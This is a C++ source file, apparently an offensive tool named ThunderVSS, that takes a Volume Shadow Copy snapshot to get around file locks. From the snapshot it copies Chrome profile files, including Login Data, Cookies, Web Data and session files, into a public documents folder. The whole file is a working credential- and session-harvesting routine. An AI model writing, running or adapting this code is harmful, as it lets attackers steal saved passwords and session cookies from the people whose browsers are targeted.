// ThunderVSS.cpp
// References
// https://wj32.org/wp/2012/12/13/how-to-backup-files-in-c-using-the-volume-shadow-copy-service-vss/
// https://stackoverflow.com/questions/3972444/volume-shadow-copy-in-c
// https://github.com/kin63camapa/vssbackuphelper/blob/master/main.cpp
// https://www.experts-exchange.com/questions/20982249/Copy-Folders-in-C.html

#include "Header.h"

#define MAX_SIZE 255

using namespace std;

typedef HRESULT(STDAPICALLTYPE *_CreateVssBackupComponentsInternal)(
	__out IVssBackupComponents **ppBackup
	);

typedef void (APIENTRY *_VssFreeSnapshotPropertiesInternal)(
	__in VSS_SNAPSHOT_PROP *pProp
	);

static _CreateVssBackupComponentsInternal CreateVssBackupComponentsInternal_I;
static _VssFreeSnapshotPropertiesInternal VssFreeSnapshotPropertiesInternal_I;

//Enable SE_BACKUP_NAME privilege in order to do VSS work
bool bTokenWork()
{
	TOKEN_PRIVILEGES tp;
	TOKEN_PRIVILEGES oldtp;
	LUID luid;
	HANDLE hToken = NULL;
	DWORD dwSize = sizeof(TOKEN_PRIVILEGES);

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &luid);

	ZeroMemory(&tp, sizeof(tp));
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &oldtp, &dwSize))
	{
		DWORD lastError = GetLastError();
		switch (lastError)
		{
		case ERROR_SUCCESS:
			return true;
			break;
		case ERROR_NOT_ALL_ASSIGNED:
			return false;
			break;
		default:
			return false;
			break;
		}
	}
	return false;
}


bool BVSSChrome(wchar_t *wProfilePath)
{
	HRESULT result;
	HMODULE vssapiBase;
	IVssBackupComponents *backupComponents = NULL;
	int iLen = wcslen(wProfilePath) - 3;	
	wchar_t *wChromeFileCheck = (wchar_t*)calloc(255, sizeof(wchar_t));
	wchar_t *wVolumeName = (wchar_t*)calloc(255, sizeof(wchar_t));
	wchar_t *wVolumeName_F = (wchar_t*)calloc(255, sizeof(wchar_t));
	wchar_t *wChoppedPath = (wchar_t*)calloc(255, sizeof(wchar_t));
	wchar_t *wChromeSrc = (wchar_t*)calloc(255, sizeof(wchar_t));
	wchar_t *wChromeDst = (wchar_t*)calloc(255, sizeof(wchar_t));
	wchar_t wChromeFiles[][255] = {
			L"Affiliation Database", L"Affiliation Database-journal", L"Bookmarks", L"Cookies", L"Cookies-journal", L"CURRENT", L"Current Session", L"Current Tabs",
			L"DownloadMetadata", L"Extension Cookies", L"Extension Cookies-journal", L"Favicons", L"Favicons-journal", L"History", L"History-journal", L"Last Session",
			L"Last Tabs", L"LOCK", L"LOG", L"Login Data", L"Login Data-journal", L"Network Action Predictor", L"Network Action Predictor-journal", L"Network Persistent State",
			L"Origin Bound Certs", L"Origin Bound Certs-journal", L"Preferences", L"QuotaManager", L"QuotaManager-journal", L"Secure Preferences", L"Shortcuts", L"Shortcuts-journal",
			L"Top Sites", L"Top Sites-journal", L"Translate Ranker Model", L"TransportSecurity", L"Visited Links", L"Web Data", L"Web Data-journal"
	};
	const wchar_t *wWriteDirParent = L"\\Users\\public\\documents\\thunderchrome\\";
	const wchar_t *wWriteDir       = L"\\Users\\public\\documents\\thunderchrome\\default\\";
	struct _stat sb;
	int i = 0;
	if (wcslen(wProfilePath) > 254)
		goto error;

	printf("\r\n***************************ThunderVSS*********************************");
	printf("\r\n**********************************************************************");
	printf("\r\nUsing VSS to grab Chrome profile");
	printf("\r\nChecking if Chrome profile exists");

	//Verify that the Chrome profile is at the given location (passed args)
	wsprintfW(wChromeFileCheck, L"%ls\\Cookies", wProfilePath);
	if (_wstat(wChromeFileCheck, &sb) == -1)
	{
		printf("\r\nError: Cannot locate Chrome profile @ %ls", wChromeFileCheck);
		goto error;
	}

	//String formatting
	wcsncpy(wVolumeName, wProfilePath, 3);
	//I'm unsure if the target logical drive requires the slash :S
	wcsncpy(wVolumeName_F, wProfilePath, 2);

	//More string formatting
	for (i = 0; i < (iLen + 1); i++)
	{
		*(wChoppedPath + i) = *(wProfilePath + 2);
		wProfilePath++;
	}
	*(wChoppedPath + i) = '\\\0';

	//Output paths
	printf("\r\nVSS Target Volume: %ls", wVolumeName);
	printf("\r\nProfile Path: %ls%ls", wVolumeName_F, wChoppedPath);
	printf("\r\nCopy Path: %ls%ls", wVolumeName_F, wWriteDir);
	printf("\r\nChecking if profile exists");

	CoInitialize(nullptr);

	//Enable SE_BACKUP_NAME to do VSS work
	if (!bTokenWork())
	{
		printf("\r\nError: bTokenWork");
		goto error;
	}

	vssapiBase = LoadLibrary("vssapi.dll");

	if (vssapiBase)
	{
		CreateVssBackupComponentsInternal_I = (_CreateVssBackupComponentsInternal)GetProcAddress(vssapiBase, "CreateVssBackupComponentsInternal");
		VssFreeSnapshotPropertiesInternal_I = (_VssFreeSnapshotPropertiesInternal)GetProcAddress(vssapiBase, "VssFreeSnapshotPropertiesInternal");
	}

	if (!CreateVssBackupComponentsInternal_I || !VssFreeSnapshotPropertiesInternal_I)
	{
		printf("\r\nError: GetProcAddress");
		return false; // Handle error
	}

	result = CreateVssBackupComponentsInternal_I(&backupComponents);

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: CreateVssBackupComponents");
		goto error;		
	}

	VSS_ID snapshotSetId;

	result = backupComponents->InitializeForBackup();

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: InitializeforBackup\r\nCommon issues are underprivileged session and running under WOW64.");
		backupComponents->Release();
		goto error;		 // If you don't have admin privileges or your program is running under WOW64, it will fail here
	}

	result = backupComponents->SetBackupState(FALSE, FALSE, VSS_BT_INCREMENTAL);

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: SetBackupState");
		backupComponents->Release();
		goto error;				 
	}

	result = backupComponents->SetContext(VSS_CTX_FILE_SHARE_BACKUP);

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: SetBackupState");
		backupComponents->Release();
		goto error;
	}

	//return backupComponents->StartSnapshotSet(&snapshotSetId);

	backupComponents->StartSnapshotSet(&snapshotSetId);

	VSS_ID snapshotId;

	result = backupComponents->AddToSnapshotSet(wVolumeName, GUID_NULL, &snapshotId);

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: AddToSnapshotSet");
		backupComponents->Release();
		goto error;
	}

	IVssAsync *async;

	result = backupComponents->DoSnapshotSet(&async);

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: DoSnapshotSet");
		backupComponents->Release();
		goto error;
	}

	result = async->Wait();
	async->Release();

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: Wait");
		backupComponents->Release();
		goto error;
	}

	VSS_SNAPSHOT_PROP prop;

	result = backupComponents->GetSnapshotProperties(snapshotId, &prop);

	if (!SUCCEEDED(result))
	{
		printf("\r\nError: GetSnapshotProperties");
		backupComponents->Release();
		goto error;
	}

	//Files to copy from the shadow copy
	//Eventually maybe copy the entire directory, but for now ...
	//Had to get out of c:\users\documents\public\ ... I realize there are better ways.

	if (_wstat(wWriteDirParent, &sb) == -1)
	{
		printf("\r\nCreating directory: %ls%ls ", wVolumeName_F, wWriteDirParent);
		if (_wmkdir(wWriteDirParent))
		{
			printf("\r\nError: Create Directory @ %ls%ls", wVolumeName_F, wWriteDirParent);
			backupComponents->Release();
			goto error;
		}
	}
	else
		printf("\r\nDirectory exists: %ls%ls", wVolumeName_F, wWriteDirParent);

	if (_wstat(wWriteDir, &sb) == -1)
	{
		printf("\r\nCreating directory: %ls%ls ", wVolumeName_F, wWriteDir);
		if (_wmkdir(wWriteDir))
		{
			printf("\r\nError: Create Directory @ %ls%ls", wVolumeName_F, wWriteDir);
			backupComponents->Release();
			goto error;
		}
	}
	else
		printf("\r\nDirectory exists: %ls%ls", wVolumeName_F, wWriteDir);

	int iArrayLen;
	iArrayLen = sizeof(wChromeFiles) / sizeof(wChromeFiles[0]);

	for (int i = 0; i < iArrayLen; i++)
	{

		wsprintfW(wChromeSrc, L"%s%s%s", prop.m_pwszSnapshotDeviceObject, wChoppedPath, wChromeFiles[i]);
		wsprintfW(wChromeDst, L"%s%s%s", wVolumeName_F, wWriteDir, wChromeFiles[i]);
		CopyFileW(wChromeSrc, wChromeDst, FALSE);
	}

	VssFreeSnapshotPropertiesInternal_I(&prop);
	backupComponents->Release();

	printf("\r\n**********************************************************************");
	return true;

error:
	free(wVolumeName);
	free(wVolumeName_F);
	free(wChoppedPath);
	free(wChromeFileCheck);
	free(wChromeSrc);
	free(wChromeDst);
	return false;
}


